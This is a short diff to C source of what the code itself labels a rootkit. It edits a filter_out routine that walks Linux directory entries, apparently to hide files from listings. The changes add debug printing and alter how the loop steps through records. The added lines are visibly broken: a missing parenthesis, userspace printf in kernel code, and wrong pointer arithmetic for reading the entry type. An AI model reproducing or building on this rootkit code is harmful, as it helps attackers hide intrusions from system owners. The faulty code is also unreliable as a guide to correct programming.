@@ -65,7 +65,17 @@ static inline int filter_out(struct linux_dirent __user *dirp, int length, int (
 		d = *(dirp+index);
 		reclen = d.d_reclen;
 		
-		pr_info("d_name: \"%s\"", d.d_name);
+		printf("%8ld  ", d.d_ino;
+		d_type = *(dirp + index + d.d_reclen - 1);
+		printf("%-10s ", (d_type == DT_REG) ?  "regular" :
+				(d_type == DT_DIR) ?  "directory" :
+				(d_type == DT_FIFO) ? "FIFO" :
+				(d_type == DT_SOCK) ? "socket" :
+				(d_type == DT_LNK) ?  "symlink" :
+				(d_type == DT_BLK) ?  "block dev" :
+				(d_type == DT_CHR) ?  "char dev" : "???");
+		printf("%4d %10lld  %s\n", d.d_reclen,
+			(long long) d.d_off, d.d_name);
 		
 		if (reclen <= 0) {
 			pr_info("ROOTKIT reclen was 0 (CRITICAL ERROR THIS SHOULD NEVER HAPPEN)");
@@ -83,7 +93,7 @@ static inline int filter_out(struct linux_dirent __user *dirp, int length, int (
 			index_copyto += reclen;
 		}*/
 		
-		index += d.d_off;
+		index += d.d_reclen;
 	}
 	
 	return length;
